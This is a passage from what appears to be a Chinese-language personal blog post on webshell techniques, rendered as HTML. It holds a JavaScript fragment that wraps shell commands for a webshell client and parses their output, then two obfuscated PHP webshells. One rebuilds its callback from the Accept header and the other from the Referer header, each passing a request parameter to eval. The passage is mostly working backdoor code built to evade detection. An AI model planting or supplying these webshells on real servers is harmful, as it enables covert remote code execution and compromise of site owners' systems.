[S];(pwd).path;`</span> :</span><br><span class="line">    <span class="string">`cd /d &quot;<span class="subst">$&#123;path&#125;</span>&quot;&amp;<span class="subst">$&#123;cmd&#125;</span>&amp;echo [S]&amp;cd;`</span> :</span><br><span class="line">    <span class="string">`cd &quot;<span class="subst">$&#123;path&#125;</span>&quot;;<span class="subst">$&#123;cmd&#125;</span>;echo [S];pwd;`</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>还有就是返回结果解析的部分。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 解析出命令执行路径</span></span><br><span class="line"><span class="keyword">const</span> indexS = _.lastIndexOf(<span class="string">&#x27;[S]&#x27;</span>);</span><br><span class="line"><span class="comment">// const indexE = _.lastIndexOf(&#x27;[E]&#x27;);</span></span><br><span class="line"><span class="keyword">let</span> _path = _.substr(indexS + <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> output = _.replace(<span class="string">`[S]<span class="subst">$&#123;_path&#125;</span>`</span>, <span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="从请求头获取执行内容"><a href="#从请求头获取执行内容" class="headerlink" title="从请求头获取执行内容"></a>从请求头获取执行内容</h3><p>​    和从文件名获取内容一样，不多赘述了，就是在使用时需要加上<code>Accpet:r</code>请求头。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;LandGrey&quot;</span>;</span><br><span class="line">$&#123;<span class="string">&quot;LandGrey&quot;</span>&#125; = <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_ACCEPT&quot;</span>].<span class="string">&quot;Land!&quot;</span>;</span><br><span class="line"><span class="variable">$f</span> = pack(<span class="string">&quot;H*&quot;</span>, <span class="string">&quot;0629121a&quot;</span>) ^ <span class="variable">$LandGrey</span>;</span><br><span class="line">array_intersect_uassoc(<span class="keyword">array</span>(<span class="variable">$_REQUEST</span>[<span class="variable">$password</span>] =&gt; <span class="string">&quot;&quot;</span>), <span class="keyword">array</span>(<span class="number">1</span>), <span class="variable">$f</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="从Referer中获取执行内容"><a href="#从Referer中获取执行内容" class="headerlink" title="从Referer中获取执行内容"></a>从Referer中获取执行内容</h3><p>​    使用需要传入<code>Referer: teste6123</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;LandGrey&quot;</span>;</span><br><span class="line"><span class="variable">$wx</span> = substr(<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_REFERER&quot;</span>],-<span class="number">6</span>,-<span class="number">4</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$wx</span>;</span><br><span class="line">forward_static_call_array(<span class="variable">$wx</span>.<span class="string">&quot;st&quot;</span>, <span class="keyword">array</span>(<span class="variable">$_REQUEST</span>[<span class="variable">$password</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/webshell/">webshell</a>
    </span>
    

    

    </div>

    
  </div>
</article>

  






    </main>

    <footer class="site-footer">
  <p class="site-info">
    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
    </br>
    
    &copy; 2022 藏青
    
  </p>
</footer>
    
    
  </div>
</div>
</body>
</html>